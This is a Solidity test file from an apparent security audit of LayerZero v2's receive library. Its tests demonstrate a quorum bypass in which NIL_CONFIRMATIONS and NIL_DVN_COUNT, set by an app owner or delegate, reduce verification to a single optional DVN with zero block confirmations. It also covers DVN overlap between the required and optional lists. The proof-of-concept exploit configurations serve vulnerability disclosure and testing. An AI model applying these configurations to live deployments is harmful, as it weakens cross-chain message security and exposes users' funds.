// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";
import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";

import { PacketUtil } from "../util/Packet.sol";
import { Constant } from "../util/Constant.sol";
import { AuditBase } from "./AuditBase.t.sol";

/// @title AV1 - DVN Quorum Bypass
/// @notice Tests the NIL_CONFIRMATIONS attack vector in UlnBase.getUlnConfig()
///
/// @dev ROOT CAUSE:
///   In UlnBase.getUlnConfig(), the config resolution for confirmations is:
///
///     if (customConfig.confirmations == DEFAULT) {
///         rtnConfig.confirmations = defaultConfig.confirmations;
///     } else if (customConfig.confirmations != NIL_CONFIRMATIONS) {
///         rtnConfig.confirmations = customConfig.confirmations;
///     }
///     // ELSE: rtnConfig.confirmations stays at 0 (struct zero-init)
///
///   When confirmations resolves to 0, _verified() becomes trivially true for any
///   submitted verification because uint64 >= 0 is always true:
///
///     verified = verification.submitted && verification.confirmations >= 0; // ALWAYS TRUE
///
/// @dev ASYMMETRY:
///   - setDefaultUlnConfigs() REJECTS NIL_CONFIRMATIONS (reverts LZ_ULN_InvalidConfirmations)
///   - setConfig() at the OApp level ACCEPTS NIL_CONFIRMATIONS without restriction
///
///   This means an OApp owner or delegate can weaponize NIL_CONFIRMATIONS to
///   silently disable all block confirmation security for their OApp.
///
/// @dev COMBINED ATTACK (AV1.6):
///   An OApp delegate can combine NIL_CONFIRMATIONS with NIL_DVN_COUNT to create
///   a config where a single optional DVN with 0 confirmations satisfies the entire
///   security requirement - regardless of what block depth the default config requires.
contract QuorumBypassTest is AuditBase {

    // ==================== AV1.1: Zero DVN Config ====================

    /// @notice Baseline guard: default config layer rejects configs with no DVNs
    /// @dev setDefaultUlnConfigs correctly prevents a config with 0 required DVNs
    ///      AND 0 optional threshold. The LZ_ULN_AtLeastOneDVN guard must hold.
    function test_AV1_1_ZeroDVNConfig_ShouldRevert() public {
        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam({
            eid: SRC_EID,
            config: UlnConfig({
                confirmations: 1,
                requiredDVNCount: 0,
                optionalDVNCount: 0,
                optionalDVNThreshold: 0,
                requiredDVNs: new address[](0),
                optionalDVNs: new address[](0)
            })
        });

        // The owner of dstReceiveUln is address(this) - set in Setup
        vm.expectRevert(abi.encodeWithSignature("LZ_ULN_AtLeastOneDVN()"));
        dstReceiveUln.setDefaultUlnConfigs(params);
    }

    // ==================== AV1.2: NIL_CONFIRMATIONS Resolution ====================

    /// @notice Confirms that the default config requires 1 confirmation and that
    ///         a DVN submitting 0 confirmations correctly fails verifiability.
    /// @dev This establishes the baseline: with the default config intact, 0-confirmation
    ///      verifications are rejected. AV1.3 then shows how NIL_CONFIRMATIONS bypasses this.
    function test_AV1_2_NilConfirmationsResolution() public {
        // The default config has confirmations=1 (set by wireFixtureV2WithRemote)
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(config.confirmations, 1, "Default confirmations should be 1");

        Packet memory packet = _makePacket(1, address(this), address(this), "test");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        // DVN submits with 0 confirmations - far below the required 1
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // With default config (confirmations=1), a DVN submission of 0 must NOT satisfy
        // the requirement. _verified() checks: verification.confirmations >= _requiredConfirmation
        // 0 >= 1 is false, so verifiable must return false.
        UlnConfig memory resolvedConfig = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        bool isVerifiable = dstReceiveUln.verifiable(resolvedConfig, keccak256(header), payloadHash);
        assertFalse(isVerifiable, "Should not be verifiable with 0 confirmations when 1 is required");
    }

    // ==================== AV1.3: NIL_CONFIRMATIONS OApp Config Disables Confirmation Check ====================

    /// @notice CRITICAL EXPLOIT: An OApp sets NIL_CONFIRMATIONS at the OApp level,
    ///         which resolves confirmations to 0, making _verified() trivially true.
    ///
    /// @dev Attack steps:
    ///   1. OApp (this contract) calls setConfig with confirmations = type(uint64).max (NIL_CONFIRMATIONS)
    ///   2. getUlnConfig resolves confirmations to 0 (struct zero-init, the else branch)
    ///   3. DVN verifies with 0 confirmations
    ///   4. _verified(): 0 >= 0 is true → packet IS verifiable
    ///   5. commitVerification succeeds → message is delivered
    ///
    /// @dev Security impact: An OApp owner/delegate can silently disable block confirmation
    ///      security for any inbound messages, allowing instant finality regardless of
    ///      what the LayerZero default requires.
    function test_AV1_3_NilConfirmations_OAppConfig_DisablesConfirmationCheck() public {
        // Step 1: Set OApp-level config with NIL_CONFIRMATIONS
        // requiredDVNCount=0 (DEFAULT) means "inherit required DVNs from default config"
        UlnConfig memory ulnConfig = UlnConfig({
            confirmations: Constant.NIL_CONFIRMATIONS, // type(uint64).max → resolves to 0
            requiredDVNCount: 0, // DEFAULT: inherit required DVNs from default config
            optionalDVNCount: 0, // DEFAULT: inherit optional DVNs from default config
            optionalDVNThreshold: 0,
            requiredDVNs: new address[](0),
            optionalDVNs: new address[](0)
        });

        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam(SRC_EID, Constant.CONFIG_TYPE_ULN, abi.encode(ulnConfig));

        // address(this) is the OApp - it calls setConfig on the endpoint for its own config
        dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);

        // Step 2: Verify the resolved config has confirmations = 0
        UlnConfig memory resolvedConfig = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolvedConfig.confirmations, 0, "NIL_CONFIRMATIONS must resolve to 0");

        // Step 3: DVN verifies with 0 confirmations (minimum possible value)
        Packet memory packet = _makePacket(2, address(this), address(this), "nil-conf-exploit");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Step 4: Packet IS now verifiable - 0 >= 0 satisfies the confirmation check
        bool isVerifiable = dstReceiveUln.verifiable(resolvedConfig, keccak256(header), payloadHash);
        assertTrue(isVerifiable, "EXPLOIT: packet verifiable with 0 confirmations after NIL_CONFIRMATIONS config");

        // Step 5: commitVerification succeeds - message is delivered with no block confirmation wait
        dstReceiveUln.commitVerification(header, payloadHash);
    }

    // ==================== AV1.4: NIL_CONFIRMATIONS Blocked for Default Config ====================

    /// @notice Demonstrates the asymmetry: the default config layer correctly blocks
    ///         NIL_CONFIRMATIONS, but the OApp-level layer does not.
    ///
    /// @dev This asymmetry is the root of the vulnerability. The protocol designers
    ///      validated NIL values at the default level but neglected to validate them
    ///      at the OApp override level, leaving a silent escape hatch.
    function test_AV1_4_NilConfirmations_BlockedForDefaultConfig() public {
        address[] memory dvns = new address[](1);
        dvns[0] = address(dstDvn);

        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam({
            eid: SRC_EID,
            config: UlnConfig({
                confirmations: Constant.NIL_CONFIRMATIONS, // type(uint64).max
                requiredDVNCount: 1,
                optionalDVNCount: 0,
                optionalDVNThreshold: 0,
                requiredDVNs: dvns,
                optionalDVNs: new address[](0)
            })
        });

        // setDefaultUlnConfigs correctly rejects NIL_CONFIRMATIONS
        vm.expectRevert(abi.encodeWithSignature("LZ_ULN_InvalidConfirmations()"));
        dstReceiveUln.setDefaultUlnConfigs(params);

        // Contrast: the OApp-level path (tested in AV1.3) accepts NIL_CONFIRMATIONS silently.
        // The guard only exists in setDefaultUlnConfigs, not in _setUlnConfig (OApp path).
    }

    // ==================== AV1.5: Delegate Can Set NIL_CONFIRMATIONS ====================

    /// @notice A designated delegate of the OApp can also set NIL_CONFIRMATIONS,
    ///         not just the OApp itself. This broadens the attack surface.
    ///
    /// @dev In LayerZero v2, OApps can set a delegate via endpoint.setDelegate().
    ///      The delegate is authorized to call setConfig on behalf of the OApp.
    ///      EndpointV2._assertAuthorized() allows msg.sender == delegates[oapp].
    ///
    /// @dev Security impact: Any compromise of the delegate key (which may be a hot
    ///      wallet or multi-sig) allows an attacker to disable confirmation checks
    ///      without requiring full OApp contract compromise.
    function test_AV1_5_DelegateCanSetNilConfirmations() public {
        address delegate = makeAddr("delegate");

        // OApp (this contract) sets a delegate on the destination endpoint
        dstEndpoint.setDelegate(delegate);

        // The delegate now sets NIL_CONFIRMATIONS on behalf of the OApp
        UlnConfig memory ulnConfig = UlnConfig({
            confirmations: Constant.NIL_CONFIRMATIONS, // type(uint64).max → resolves to 0
            requiredDVNCount: 0, // DEFAULT: inherit from default config
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: new address[](0),
            optionalDVNs: new address[](0)
        });

        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam(SRC_EID, Constant.CONFIG_TYPE_ULN, abi.encode(ulnConfig));

        // Delegate calls setConfig - _assertAuthorized passes because msg.sender == delegates[oapp]
        vm.prank(delegate);
        dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);

        // Resolved config has confirmations = 0
        UlnConfig memory resolvedConfig = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolvedConfig.confirmations, 0, "Delegate can set NIL_CONFIRMATIONS, resolves to 0");

        // Verification with 0 confirmations now succeeds
        Packet memory packet = _makePacket(3, address(this), address(this), "delegate-exploit");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        bool isVerifiable = dstReceiveUln.verifiable(resolvedConfig, keccak256(header), payloadHash);
        assertTrue(isVerifiable, "EXPLOIT: delegate-set NIL_CONFIRMATIONS disables confirmation check");
    }

    // ==================== AV1.6: Combined Attack - Minimal Quorum + Zero Confirmations ====================

    /// @notice FULL EXPLOIT: Combines NIL_DVN_COUNT (0 required DVNs) with NIL_CONFIRMATIONS
    ///         (0 confirmations) to create a config where a single optional DVN calling
    ///         verify() with any confirmation count satisfies the entire security requirement.
    ///
    /// @dev Attack config:
    ///   - requiredDVNCount = NIL_DVN_COUNT  → 0 required DVNs  (overrides default)
    ///   - optionalDVNCount = 1              → 1 optional DVN
    ///   - optionalDVNThreshold = 1          → need 1 of 1 optional DVN
    ///   - confirmations = NIL_CONFIRMATIONS → resolves to 0 (no block depth required)
    ///
    /// @dev Result: A single DVN calling verify() with confirmations=0 satisfies:
    ///   - Required DVN check: skipped (requiredDVNCount = 0)
    ///   - Optional DVN check: 1 DVN verified >= threshold of 1 → PASS
    ///   - Confirmation check: DVN.confirmations (0) >= config.confirmations (0) → PASS
    ///
    /// @dev Security impact: This completely bypasses the intended layered security model.
    ///      An OApp operator or compromised delegate can reconfigure the OApp to accept
    ///      messages from a single DVN with zero block confirmations - equivalent to
    ///      accepting unconfirmed transactions as final.
    function test_AV1_6_MinimalQuorum_OptionalOnlyWithZeroConfirmations() public {
        address dvnAddr = address(dstDvn);

        // Build the minimal-quorum zero-confirmation config
        address[] memory optionalDvns = new address[](1);
        optionalDvns[0] = dvnAddr;

        UlnConfig memory ulnConfig = UlnConfig({
            confirmations: Constant.NIL_CONFIRMATIONS,  // → resolves to 0
            requiredDVNCount: Constant.NIL_DVN_COUNT,   // → overrides required to 0
            optionalDVNCount: 1,
            optionalDVNThreshold: 1,                    // 1-of-1 optional DVN
            requiredDVNs: new address[](0),             // empty list required when NIL_DVN_COUNT
            optionalDVNs: optionalDvns
        });

        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam(SRC_EID, Constant.CONFIG_TYPE_ULN, abi.encode(ulnConfig));

        // OApp sets the combined attack config
        dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);

        // Confirm the resolved config: 0 required DVNs, 1 optional DVN, 0 confirmations
        UlnConfig memory resolvedConfig = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolvedConfig.requiredDVNCount, 0, "Required DVN count must be 0");
        assertEq(resolvedConfig.optionalDVNCount, 1, "Optional DVN count must be 1");
        assertEq(resolvedConfig.optionalDVNThreshold, 1, "Optional threshold must be 1");
        assertEq(resolvedConfig.confirmations, 0, "Confirmations must resolve to 0");

        // DVN verifies with 0 confirmations - the bare minimum
        Packet memory packet = _makePacket(4, address(this), address(this), "combined-exploit");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Packet IS verifiable: single optional DVN + 0 confirmations = full quorum satisfied
        bool isVerifiable = dstReceiveUln.verifiable(resolvedConfig, keccak256(header), payloadHash);
        assertTrue(isVerifiable, "EXPLOIT: 1 optional DVN + 0 confirmations satisfies full quorum");

        // commitVerification succeeds - message delivered with no meaningful security
        dstReceiveUln.commitVerification(header, payloadHash);
    }

    // ==================== AV1.3b: DVN Overlap Required/Optional ====================

    /// @notice A single DVN listed in both required and optional arrays counts toward
    ///         both checks simultaneously, making the effective quorum 1 instead of 2.
    ///
    /// @dev The UlnConfig comment explicitly says "allowed overlap with optionalDVNs",
    ///      but this design decision has a non-obvious security implication: an OApp
    ///      admin who configures required=1 + optional=1/1 with the same DVN in both
    ///      lists may believe they require 2 independent signatures, when in reality
    ///      a single DVN signature satisfies both checks.
    ///
    /// @dev While documented as intentional, this should be surfaced in security reviews
    ///      as a misconfiguration risk that silently degrades security guarantees.
    function test_AV1_3_DVNOverlapRequiredOptional() public {
        address dvnAddr = address(dstDvn);

        address[] memory requiredDvns = new address[](1);
        requiredDvns[0] = dvnAddr;
        address[] memory optionalDvns = new address[](1);
        optionalDvns[0] = dvnAddr;

        // Set a default config where the same DVN appears in both required and optional lists
        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam({
            eid: SRC_EID,
            config: UlnConfig({
                confirmations: 1,
                requiredDVNCount: 1,
                optionalDVNCount: 1,
                optionalDVNThreshold: 1,
                requiredDVNs: requiredDvns,
                optionalDVNs: optionalDvns
            })
        });

        dstReceiveUln.setDefaultUlnConfigs(params);

        // A single DVN verification satisfies both required(1) and optional(1/1)
        Packet memory packet = _makePacket(5, address(this), address(this), "overlap-test");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);

        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        bool isVerifiable = dstReceiveUln.verifiable(config, keccak256(header), payloadHash);

        // The same DVN satisfies both checks - effective security is 1 DVN, not 2
        assertTrue(isVerifiable, "Single DVN in both lists satisfies both required and optional checks");

        // Note: the config appears to require 2 DVN involvements (1 required + 1 optional threshold)
        // but only 1 unique DVN is actually needed. This is a misconfiguration risk.
        assertEq(config.requiredDVNCount, 1, "Config shows 1 required DVN");
        assertEq(config.optionalDVNThreshold, 1, "Config shows threshold 1");
        // Despite the above, ONE signature suffices - intended security may be 2x stronger
    }
}
